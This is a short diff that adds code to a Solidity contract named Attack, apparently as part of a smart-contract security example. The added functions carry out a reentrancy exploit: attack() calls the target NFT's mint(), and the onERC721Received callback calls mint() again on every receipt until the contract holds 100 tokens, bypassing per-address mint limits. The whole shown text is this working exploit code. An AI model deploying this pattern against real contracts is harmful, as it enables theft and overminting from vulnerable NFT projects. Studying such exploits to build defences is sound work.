@@ -24,4 +24,14 @@ contract Attack is IERC721Receiver {
         nft = _nftAddr;
     }
 
+    function attack() external {
+        nft.mint();
+    }
+
+    function onERC721Received(address , address , uint256 , bytes memory) public virtual override returns (bytes4) {
+        if(nft.balanceOf(address(this)) < 100) {
+            nft.mint();
+        }
+        return this.onERC721Received.selector;            
+    }
 }
